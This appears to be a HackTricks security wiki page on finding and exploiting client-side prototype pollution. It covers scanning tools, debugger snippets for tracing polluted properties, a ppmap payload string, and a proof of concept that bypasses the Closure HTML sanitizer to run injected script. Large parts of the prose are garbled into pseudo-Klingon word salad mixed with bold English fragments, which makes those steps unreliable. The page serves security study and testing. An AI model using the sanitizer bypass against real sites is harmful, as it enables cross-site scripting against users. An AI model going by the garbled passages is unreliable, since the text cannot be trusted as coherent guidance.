# Client Side Prototype Pollution

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Discovering using Automatic tools

The tools [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **and** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) can be used to **find prototype pollution vulnerabilities**.

Moreover, you could also use the **browser extension** [**PPScan**](https://github.com/msrkp/PPScan) to **automatically** **scan** the **pages** you **access** for prototype pollution vulnerabilities.

### Debugging where a property is used <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### tlhegh cha'logh Prototype Pollution <a href="#5530" id="5530"></a>

DaH jatlh prototype pollution vulnerability 'e' vItlhutlh tools, 'ej 'ej code not 'oH complex, 'oH 'e' vItlhutlh vulnerability vItlhutlh keywords 'ej `location.hash`, `decodeURIComponent`, 'ej `location.search` in the Chrome Developer Tools. vaj approach vItlhutlh pinpoint vulnerable section JavaScript code.

larger 'ej complex codebases, straightforward method vItlhutlh discover vulnerable code involves following steps:

1. vItlhutlh tool vItlhutlh identify vulnerability 'ej obtain payload designed set property constructor. Example provided ppmap might look like: `constructor[prototype][ppmap]=reserved`.
2. Set breakpoint first line JavaScript code execute page. Refresh page payload, pausing execution this breakpoint.
3. While JavaScript execution paused, execute script following JS console. script vItlhutlh signal 'ppmap' property created, aiding locating origin:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. **QaQHa'DI'** **Sources** tab **ghItlh** **"Resume script execution"** **ghItlh**. **JavaScript** **jImej** **'ppmap'** **property** **polluted** **vaj.** **'ppmap'** **property** **polluted** **ghItlh** **exact location** **identification** **jIvuv. **Call Stack** **chegh** **examine** **ghItlh**, **pollution** **occur** **stacks** **chegh** **qImHa'**.

**stack** **investigate** **choH** **stacks** **qImHa'**, **JavaScript library files** **associated** **stacks** **target** **useful** **often** **deciding**. **relevant stack** **examine** **attachment** **library files** **visible** **right side**, **guidance** **image** **provided**. **stacks** **multiple** **scenarios** **lines 4** **6**, **logical choice** **stack** **line 4**, **occurrence** **initial** **represents** **pollution** **cause** **root**. **stack** **clicking** **vulnerable code** **direct**.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## **Script Gadgets** **qawHaq**

**gadget** **code** **abused** **PP vulnerability** **discovered** **jImej**.

**application** **simple**, **search** **vItlhutlh** **keywords** **`srcdoc/innerHTML/iframe/createElement`** **review** **source code** **check** **javascript execution** **leads**. **techniques** **mentioned** **gadgets** **find** **might** **case**, **source code review** **reveals** **gadgets** **nice** **example**.

### **Example Finding PP gadget in Mithil library code**

**writeup** **check** **[https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)**

## **Recompilation** **payloads** **vulnerable libraries**

* **[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)**
* **[https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)**

## **HTML Sanitizers bypass** **PP** **via**

**research** **[This research](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)** **PP gadgets** **bypass** **sanizations** **provided** **HTML sanitizers libraries**:

* #### **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (668).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* #### **dompurify**

<figure><img src="../../../.gitbook/assets/image (669).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* #### **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## References

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
